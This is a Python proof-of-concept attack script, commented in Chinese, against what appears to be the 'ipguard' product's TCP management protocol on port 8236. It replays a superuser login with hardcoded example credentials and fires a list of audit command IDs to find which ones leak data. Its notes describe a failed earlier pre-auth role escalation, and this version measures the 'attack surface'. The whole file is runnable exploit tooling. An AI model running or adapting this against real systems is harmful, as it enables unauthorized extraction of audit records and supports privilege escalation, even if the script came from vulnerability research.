r"""poc_role1_audit_exfil_v2.py — v2: 用 SU 正式登录后测 audit cmd

v1 教训:
  - 测试环境 cmd=0x1001 pre-auth 升 role-1 返 flags=0xc801 (失败)
  - 后续 cmd=0x4461 timeout — server 没接收
  - 说明 pre-auth role-1 升级在该环境不奏效 (可能 LoginID 字段未带 / 配置限制)

v2 策略:
  - 用正式 SU 登录 (Admin/admin123456 → role=0x031d) 拿真实 role/token
  - 在同 socket 上发 audit cmd
  - 验证 audit handler 是否在 post-auth 下能正常返回数据
  - 这是 baseline: 测 "已认证 SU" 能拿什么 audit data
  - 进一步可对比 pre-auth role-1 来量化"role-1 攻击面"

用法:
  python poc_role1_audit_exfil_v2.py <host> <user> <pwd>
"""
import os, socket, struct, sys, zlib, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import build_packet_with_state, recv_full_packet, parse_packet


# 测试目标
TARGETS = [
    # 已知 baseline (§7 已确认 role-1 可达)
    (0x4661, 0,  0, "★ baseline: HA 拓扑"),
    (0x1500, 0,  0, "★ baseline: CONSOLE_PARAMS read"),
    # 主要 audit handler
    (0x4461, 0,  0, "Audit-Batch 主入口 (12.9KB, SP 0x90F30)"),
    (0x4461, 0, 64, "Audit-Batch 主入口 (64B body)"),
    (0x2100, 0,  0, "Audit-Query 最大 (11.7KB)"),
    (0x2100, 0, 64, "Audit-Query 最大 (64B body)"),
    (0x4471, 0,  0, "Audit-Batch (11.4KB, SP 0x90F40)"),
    (0x447b, 0,  0, "Audit-Batch (10.4KB, SP 0x90F4A)"),
    (0x2001, 0,  0, "Audit-Query 主入口 (7.7KB)"),
    (0x2001, 0, 64, "Audit-Query 主入口 (64B body)"),
    # 中型审计
    (0x462a, 0,  0, "Software-And-HA (5.2KB)"),
    (0x4625, 0,  0, "Software-And-HA (4.2KB)"),
    # 小型审计
    (0x2010, 0,  0, "Audit-Query 中型"),
    (0x2081, 0,  0, "Audit-Query 小型"),
    # 之前已审过的 (对照)
    (0x2120, 0, 32, "ConsoleCmd_2120 (4B input → APP_IDENTIFY)"),
    (0x4541, 1, 32, "Software Inventory Upload (write)"),
    (0x4663, 0,  0, "状态查询小函数"),
]


def fresh_send(host, port, user, pwd, body, cmd, sub=0, flags=0x4600, timeout=8.0):
    """新连接 → SU 登录 → 发 cmd → 拿响应"""
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, role, tok, _ = replay_login(s, user, pwd, base_nonce,
                                         show_crypto=False, verbose=False)
        nxt = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=nxt,
            sess_state_16_24=struct.pack("<II", role, tok),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body)
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s)), role, tok
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": f"recv: {type(e).__name__}"}, role, tok
    except Exception as e:
        return {"_err": f"login/send: {type(e).__name__}: {e}"}, None, None
    finally:
        if s:
            try: s.close()
            except: pass


def analyze_response(r, cmd, label):
    if not r or "_err" in r:
        return ("ERROR", r.get('_err', '?') if r else 'None')
    fl = r.get('flags', 0)
    plen = r.get('payload_len', 0) or r.get('plen', 0)
    plain = r.get('plain', b"")

    if plen == 0:
        msg = "DENIED"
        if fl & 0x8000: msg += "/err"
        if fl & 0x0800: msg += "/ACL"
        return (msg, f"flags=0x{fl:04x}")

    if not plain:
        return ("ENCRYPTED", f"plen={plen} but plain empty")

    # 状态码 DWORD@0
    status = struct.unpack_from("<I", plain, 0)[0] if len(plain) >= 4 else None

    # 提取 wcs
    try:
        wcs = plain.decode("utf-16-le", errors="ignore")
        import re
        runs = re.findall(r'[\x20-\x7e]{6,}', wcs)
        if runs:
            return ("DATA_LEAK", {
                "plen": plen,
                "status": f"0x{status:08x}({status})" if status is not None else "?",
                "wcs_runs": runs[:10],
                "wcs_count": len(runs),
                "first_hex": plain[:96].hex(),
            })
    except: pass

    return ("DATA_NO_WCS", {
        "plen": plen,
        "status": f"0x{status:08x}({status})" if status is not None else "?",
        "first_hex": plain[:96].hex(),
    })


def main():
    if len(sys.argv) < 4:
        print(__doc__); sys.exit(1)
    host = sys.argv[1]
    user = sys.argv[2]
    pwd = sys.argv[3]

    print(f"*** role-1 audit exfiltration v2 ***")
    print(f"    host={host}, user={user!r}")
    print(f"    模式: SU 登录后测 {len(TARGETS)} 个 cmd 的响应")
    print()

    results = []
    role_seen = None
    for i, (cmd, sub, body_size, label) in enumerate(TARGETS, 1):
        body = b"\x00" * body_size if body_size > 0 else b""
        print(f"[{i:>2}/{len(TARGETS)}] cmd=0x{cmd:04x}/{sub} body={body_size}B  {label}")
        t0 = time.time()
        r, role, tok = fresh_send(host, 8236, user, pwd, body, cmd, sub)
        dt = time.time() - t0
        if role: role_seen = role
        status, detail = analyze_response(r, cmd, label)
        print(f"        elapsed={dt:.2f}s  status={status}")
        if isinstance(detail, dict):
            if 'wcs_runs' in detail:
                print(f"        plen={detail['plen']} status_code={detail['status']}")
                print(f"        ⭐ wcs_runs ({detail['wcs_count']}):")
                for run in detail['wcs_runs'][:6]:
                    print(f"           {run[:100]!r}")
            else:
                print(f"        plen={detail['plen']} status_code={detail.get('status', '?')}")
                print(f"        hex[0:64]={detail['first_hex'][:128]}")
        else:
            print(f"        {detail}")
        results.append((cmd, sub, label, status))
        print()
        time.sleep(0.5)

    # 汇总
    print("="*70)
    print(f"  汇总 (SU role={role_seen})")
    print("="*70)
    from collections import Counter
    cnt = Counter(r[3].split('/')[0] for r in results)
    for k, v in sorted(cnt.items(), key=lambda x: -x[1]):
        print(f"  {k:<14} {v}")
    print()

    data_leaks = [r for r in results if r[3].startswith("DATA")]
    print(f"  ✅ 拿到数据的 cmd: {len(data_leaks)} / {len(TARGETS)}")
    for cmd, sub, label, st in data_leaks:
        print(f"     0x{cmd:04x}/{sub:<3} {st:<12}  {label}")
    print()
    denied = [r for r in results if r[3].startswith("DENIED")]
    print(f"  ❌ 被拒的 cmd: {len(denied)}")
    for cmd, sub, label, st in denied[:8]:
        print(f"     0x{cmd:04x}/{sub:<3} {st:<24}  {label}")


if __name__ == "__main__":
    main()
